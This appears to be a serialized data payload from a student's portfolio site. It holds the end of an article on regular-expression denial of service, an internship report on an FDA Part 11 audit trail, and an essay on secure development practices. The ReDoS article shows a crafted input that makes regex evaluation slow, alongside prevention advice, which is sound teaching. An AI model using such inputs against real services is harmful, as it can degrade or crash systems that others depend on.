time')\n```\n\nOutput:\n\n```text\nhttps:\u002F\u002Fgoogle.com\u002Faaaaaaaaaaaaaaaaaaaaaaaa@ is not a valid url\nregex evaluation time: 2196ms\n```\n\nAs you can observe, the evaluation time of regex has been increased by 1000 times by adding only 25 characters to previous url. Let's see why.\n\n__Fair warning, I actually managed to crash my computer when trying this out by giving a super long string as input._\n\n### The attack \n\n\n\n### Prevent This Vulnerability\n\nRecognizing evil regular expressions requires in-depth knowledge \u002F experience with them. There are also tools to recognize these types of regular expressions. As a software-engineer you have to be vary careful when applying regular expressions in your code. Always have a limit on how many characters to accept from a input. Or use standard libraries to check certain expressions. \"Sanitize and filter user's inputs\" this is a rule valid also for other type of attacks. Since the attack can be originated from a input string, filter and sanitize it before to evaluate it to avoid unhandled errors or attacks.\n\n",readingTime:"7 min read"},{slug:"internship_cytosmart_gdpr",description:"summary about the implementation of the GDPR-CFR legislation that I have applied within the company CytoSMART.",id:j,title:"GDPR",duration:k,image:".\u002Fimages\u002Fprojects\u002Finternship\u002Fcytosmart\u002Fgdpr.jpg",tech:[{name:"gdpr"},{name:"annex 11"}],category:[{name:b},{name:h},{name:c},{name:m},{name:"internship"}],author:{name:d,image:e,social:{twitter:f}},createdAt:"2021-06-06T00:00:00.000Z",dir:"\u002Fprojects\u002Finternship\u002Fcytosmart",path:"\u002Fprojects\u002Finternship\u002Fcytosmart\u002Fgdpr",extension:g,updatedAt:a,bodyPlainText:"\n# General Data Protection Regulation (GDPR) and Annex 11\nAnnex 11 is the FDA 21 CFR part 11 European equivalent.\n\nTitle 21 Part 11 is the portion of Title 21 of the Code of Federal Regulations that establishes the U.S. Electronic Records and Electronic Signatures (ERES) regulations. Part 11, as it is commonly referred to, defines the criteria under which electronic records and electronic signatures are considered reliable and equivalent to paper documents.\n\nInternship [@CytoSMART](https:\u002F\u002Fcytosmart.com)\n\nThis report is about the internship I did at CytoSMART.\nCytoSMART is a young company whose aim is to offer products (equipment) for biomedical laboratories in as large a market as possible which is worldwide. This company therefore wants to take into account specific requirements and restrictions associated with sales on the international market as early as the development phase. For the development of equipment and software in the pharmaceutical industry, legislation has been created that sets criteria that a device\u002Fsoftware must meet. This legislation is called FDA CFR 21 Part 11.\n\nCytoSMART has hired a total of 3 trainees,  which have been divided into different parts within the processing of the CFR 21 Part 11 legislation. The components are:  the Audit trail, the electronic signatures and the approval flow\u002Fuser management. My part in this project will be the application of the  ”Audit trail”part, as stated in the FDA requirements CFR 21 Part 11, to the current software. The application must have a setting so that it can function according to the standards as described in legislation CFR 21 Part 11, but this setting must also be able to be turned off. The software had to be developed to be able to switch between these settings, on and off.\n\nThe technology used for the front-end consists of Vue.js with a back-end written in C#(ASP.NET), both of which have been made uniform to this  legislation. Previously, almost nothing had been adapted to the application, so that it would not comply with these guidelines as required by CytoSMART. However, after investigation, it was found that the software still met a number of these requirements.\n\nThe audit trail is incorporated in a visual GUI dashboard that is clear and legible for the user, with various functionalities such as export to a PDF format.  It is also possible to sort on different  levels. These levels can be subdivided into:  ”Company”,  ”User”, ”Entity\" and ”Action”.\n\nThe audit trail has been approved by CytoSMART and will be used in the future by various researchers for cell experiments. This was evident from the meeting that took place during the final delivery, the colleagues were also enthusiastic. In addition, the cooperation with the other trainees also went very well and we put together a lot of functionalities so that together they form a functional whole.\n\nI would advise CytoSMART to also implement the CFR functionalities for the other devices so that they can also offer them in the US. In addition, they can of course easily usethe audit trail module that I developed, which is very generic and modular in structure.\n\n## Research\n\nBased on the purpose of the project, a key research question can be created. This research question is as follows:\n\n```text \nHow can I accomplish the Audit-Trail within the application, and thus have it meet the requirements of the FDA as stated in CFR b?\n```\n\nTo answer the research question, I explored a few sub-topics in more detail. Important guideline in this, will be the steps that other companies in a similar path have already taken. This is because the aforementioned FDA requirements have been in place for some time. Therefore, I took a closer look at comparable companies that already have access to the market in the United States and already meet the requirements. It is therefore important to gain insight into how these companies have completed the validation process and thus obtained their approval. This therefore leads to the asking of the following questions:\n\nA brief summary of the research topics::\n\n- Implementation companies in the same sector\n- Audit trail structure\n- Efficiency database structure\n- Visualization\n- Form persistence\n- Retention period\n- Prerequisites\n- Whole Flow\n\nTo clarify the research topics, a description has been made for each topic, which zooms in even further. These research topics are further explained in the Process phases of the project. Also, the research topics are elaborated in the appendix \"research's document\" Research. From these findings, the first process phases within CytoSMART were started. These can be read in phases.\n\n### Technologies\nThe following technologies will be used to complete this project:\n\n- Vue\n- c# (CSharp)\n- Rest Api - maturity-level \n- Microsoft SQL \n- ASP.NET\n\n## Conclusion\n\nDuring my internship, I built the audit trail module for CytoSMART. This was developed in the C# language with the framework ASP.NET.\n\nThe audit trail has been found to be well implemented by CytoSMART and will be used by different researchers for cell experiments in the future. This was shown in the meeting that took place at the final sprint delivery, also the colleagues were enthusiastic. In addition, the collaboration with the other interns also went very well and we tuned many functionalities together for the best integration so that together it forms a functional whole.\n\nI would advise CytoSMART to start implementing the CFR functionalities for the other devices as well so they can start offering them in the US. In doing so, of course, they can easily use the audit trail module I developed which is very generic and modular. I would also advise to further expand the visual functionalities and the filters and I would advise to make an export function that makes it possible to use this audit trail data for example in Microsoft Excel. \n\n## Evaluation\n\nThe collaboration\u002Fcollaboration within CytoSMART was good. Received a lot of positive feedback from the entire CytoSMART team. The services, which were rendered were found to be positive. Also colleagues and fellow trainees were very satisfied with my cooperation, communication and delivered work processes. However, dealing with colleagues\u002Ftrainees of different nationalities and thus different cultural backgrounds took some getting used to in the beginning. During my internship period my enthusiasm with regard to achieving my learning goal clearly increased and resulted in a positive contribution. However, I will have to apply myself even more to a better control of Javascript. Also the commercial side will get more attention in future internships. \n\nDuring my internship period, my knowledge in the field of C# ASP.NET has improved; also in the field of front-end Vue.js with extensions like VueX. The experience, which I have gained, is very different than at the Fontys classes, because here you have to start applying the material learned at school and that is often different in practice than in theory. In practice, you have to think more along with the customer and then look for a solution specifically to the wishes of the customer. This internship at CytoSMART turned out to be very important for my future.\n\nI experienced the internship at CytoSMART as particularly instructive, interesting but also completely new due to the terminology in medical ICT and English. The elaboration of the project plan was successful and also the processes were very instructive. The working language English was very instructive for me due to the many medical English designations in word and writing. Also, this internship was a challenge on multiple fronts and I learned not to be afraid of new processes namely medical ICT and to express them in the English language. I have experienced a lot of cooperation\u002Fcommitment and feedback from the whole CytoSMART team of which I would like to thank all employees very much. I hope to find enough challenge in a new project at my next internship and to become even more professional by being involved even more in commerce. I also want to thank my first assessor for his guidance, tips and commitment. I got to know my assessor as a good supervisor, who always knew how to appreciate me on my minus but also my plus points. The Corona virus in particular had a great impact on my internship. On Mondays I could go to CytoSMART. The other days everything went online. But I could always turn to my colleagues and fellow interns online. Because of the Coronavirus, it was sometimes difficult to communicate but in the end it was a very valuable learning period. 2020 with COVID-19 was a year that we all will not soon forget. It was a special year full of challenging situations. Nevertheless, together we made the very best of it.  Together we showed decisiveness and flexibility. And we can be proud of that.\n\nIn any case, I want to continue studying and training in ICT Software, because that is where my heart and interests lie, and therefore also my motivation to continue studying in this field.\n",readingTime:l}],_img:{}}],fetch:{},mutations:[]}}("2022-01-17T17:15:48.161Z","minor","body of knowledge","Rik Peeters","\u002Fimages\u002Fme.jpg","rikp777",".md","cyber","\u002Fprojects\u002Fminor",null,"1 day","8 min read","software-engineering","6 min read","\u002Fprojects\u002Fother","OSINT","\u002Fimages\u002Fprojects\u002Fminor\u002Fosint\u002Fmain.png","2021-12-07T00:00:00.000Z","math","digital forensics","machine learning","1 whole day","statistics","1 whole day in total","\u002Fimages\u002Fprojects\u002Fminor\u002Fdigital-forensics\u002Fdigital-forensics.png","2021-10-31T00:00:00.000Z","ethics","3 min read","minor_learning-objectives","Learning Objectives for minor Cyber summarized & PDR with evaluation","Learning Objectives & PDR","\u002Fimages\u002Fprojects\u002Fminor\u002Flearning-objectives\u002Fmain.jpg",false,"15 min read","https:\u002F\u002Fgithub.com\u002Frikp777\u002Fstat_project","Own a Linux machine","\n# Methodologies and practices of secure development \n\n## Privacy by design \n\nWhen using the Privacy by Design principle, privacy is considered from the beginning of the design of an information system. The emphasis on privacy is maintained throughout the system's lifespan. The goal is to improve personal data security. This can already be accomplished by considering the necessity of storage: which data are truly required and which are not? Data must be considered throughout its entire life cycle, including storage, modification, and deletion. Organizational aspects, in addition to technical aspects, play a role.\n\nPrivacy by Design is often mentioned in the same breath as Privacy by Default. They are related concepts; Privacy by Default refers to the default settings of a program, website, service or device.\nPrivacy by Default and Privacy by Design are enshrined as concepts in Article 25 of the Algemene Verordening Gegevensbescherming (AVG).\n\n### Proactive not Reactive; Preventative not Remedial\n\nThe Privacy by Design approach is characterized by proactive rather than reactive measures. It anticipates and prevents privacy invasive events before they happen. PbD does not wait for privacy risks to materialize, nor does it offer remedies for resolving privacy infractions once they have occurred − it aims to prevent them from occurring. In short, Privacy by Design comes before-the-fact, not after.\n\n### Privacy as the Default\n\nWe can all be certain of one thing − the default rules! Privacy by Design seeks to deliver the maximum degree of privacy by ensuring that personal data are automatically protected in any given IT system or business practice. If an individual does nothing, their privacy still remains intact. No action is required on the part of the individual to protect their privacy − it is built into the system, by default.\n\n### Privacy Embedded into Design\n\nPrivacy by Design is embedded into the design and architecture of IT systems and business practices. It is not bolted on as an add-on, after the fact. The result is that privacy becomes an essential component of the core functionality being delivered. Privacy is integral to the system, without diminishing functionality\n\n### Full Functionality – Positive-Sum, not Zero-Sum\n\nPrivacy by Design seeks to accommodate all legitimate interests and objectives in a positive-sum “winwin” manner, not through a dated, zero-sum approach, where unnecessary trade-offs are made. Privacy by Design avoids the pretence of false dichotomies, such as privacy vs. security, demonstrating that it is possible, and far more desirable, to have both.\n\n### End-to-End Security – Lifecycle Protection\n\nPrivacy by Design, having been embedded into the system prior to the first element of information being collected, extends securely throughout the entire lifecycle of the data involved — strong security measures are essential to privacy, from start to finish. This ensures that all data are securely retained, and then securely destroyed at the end of the process, in a timely fashion. Thus, Privacy by Design ensures cradle to grave, secure lifecycle management of information, end-to-end.\n\n### Visibility and Transparency\n\nPrivacy by Design seeks to assure all stakeholders that whatever the business practice or technology involved, it is in fact, operating according to the stated promises and objectives, subject to independent verification. Its component parts and operations remain visible and transparent, to both users and providers alike. Remember, trust but verify!\n\n### Respect for User Privacy\n\nAbove all, Privacy by Design requires architects and operators to keep the interests of the individual uppermost by offering such measures as strong privacy defaults, appropriate notice, and empowering user-friendly options. Keep it user-centric!\n\n### Certification mechanism \n\nThe Personal Data Authority or a national accreditation body may accredit a certification body, to provide certificate showing that a controller or processor is operating in compliance with the AVG. This makes it clear to the user that his data is being handled securely. \n\n## Security by design \n\nSecurity should be a top priority for your developers as they implement your product's requirements at every stage of the software development life cycle (SDLC). We'll look at how to construct a secure SDLC in this article, so you can catch errors in requirements before they become security issues in production.\n\nSoftware Development Lifecycle (SDLC) describes how software applications are built. It usually contains the following phases: \n\n### Requirements \n\nThe requirements for new features are gathered from many stakeholders during this early stage. It's critical to identify any security concerns when gathering functional requirements for the new release.\n\n### Design\n\nThis phase turns in-scope requirements into a plan for how the application should be implemented. Functional requirements define what should happen, whereas security requirements indicate what should not happen.\n\n### Development \n\nWhen it comes to putting the idea into action and making it a reality, the focus frequently shifts to ensuring that the code is well-written from a security standpoint. Secure coding guidelines are usually created, as are code reviews to ensure that these guidelines have been followed appropriately. These code reviews can be done manually or automatically using tools like static application security testing (SAST).\n\n### Verification \n\nThe Verification step involves a thorough testing cycle to ensure that applications meet the original design and requirements. This is also an excellent opportunity to implement automated security testing, which can be done using a variety of technologies. Unless these tests pass, the application will not be deployed. To control verification and release, this phase frequently involves automated techniques like as CI\u002FCD pipelines.\n\n### Maintenance and evolution \n\nThe story doesn't finish when the app is launched. In reality, security flaws that slipped through the holes in the application may be discovered decades after it has been deployed. These flaws can be detected in the code that developers authored, but they're also becoming more common in the underlying open-source components that make up an application. As a result, the number of \"zero-days\" vulnerabilities that were previously undiscovered but were discovered in production by the application's maintainers increases.\n\n## Secure Development Lifecycle (SDL)\n\nIn its simplest form, the SDL is a process that standardizes security best practices across a range of products and\u002For applications. It captures industry-standard security activities, packaging them so they may be easily implemented. The software development lifecycle consists of several phases, which I will explain in more detail below.\n\n### The problems the SDL solves\n\nThe lack of a standard approach to securing products causes problems. For one thing, vulnerabilities run rampant in shipped products. The triage and response needed to deal with this are major resource sinks. As a result, developers spend too much time fixing code they wrote in the past and not enough focusing on the future.\n\nThe second problem is that developers tend to repeat the same security mistakes, each time expecting a different response (which is the definition of insanity). The third issue is that problems are found at release or after deployment, beyond the reasonable time when the problems could be mitigated in an inexpensive manner.\n\nFinally, without a security standard customers have no assurance that a given product is secure. A single product considered for purchase may be one of the good ones, or it might be terrible from a security perspective. Without an SDL, there is no product security parity across the company. And without a standard process, some product teams ignore security altogether.\n\n**Benefits of SDL**\n\nThe most important reasons to adopt SDL practices are:\n\n1. Higher security: In SDL, continuous monitoring for vulnerabilities results in better application quality and mitigation of business risks.\n2. Cost reduction: In SDL, early attention to flaws significantly reduces the effort required to detect and fix them.\n3. Regulatory compliance: SDL encourages a conscientious attitude toward security-related laws and regulations. Ignoring them may result in fines and penalties, even if no sensitive data is lost.\n4. Development teams get continuous training in secure coding practices.\n5. Security approaches become more consistent across teams.\n6. Customers trust the team more, because they see that special attention is paid to their security.\n7. Internal security improves when SDL is applied to in-house software tools.\n\n## In practice\n\nCommonly, secure programming improvement lifecycle measures are separated into the accompanying stages:\n\n###\tConcept and planning\n\nThis stage is used to define the application concept and analyze its suitability. This includes creating a task plan, writing project requirements, and assigning HR.\n\n### Architecture and design\n\nThis stage is used to plan an item that fits the requirements. This includes displaying the application's structure and usage scenarios, as well as identifying external components that can help speed up development. A plan report is the result of this stage.\n\n### Implementation\n\nThis is the point at which a true application is created. Composing the application code, debugging it, and producing stable forms suitable for testing are all part of this process.\n\n### Testing and bug fixing\n\nThis stage is used to identify and correct application errors. This includes running automated and manual tests, identifying problems, and resolving them.\n\n### Release and maintenance\n\nAn application goes live at this time, with multiple samples running in a variety of scenarios. Finally, new forms and fixes become available, and some clients opt to redesign while others stick with the more established options.\n\n### End of life\n\nThe term \"end of life\" refers to when a product's developer stops supporting it. Applications that store sensitive data may be subject to strict end-of-life guidelines.\n","\u002Fimages\u002Fprojects\u002Fminor\u002Fstatistics\u002Fstatistics.jpg","2021-11-19T00:00:00.000Z","\u002Fprojects\u002Fsoftware-engineering")));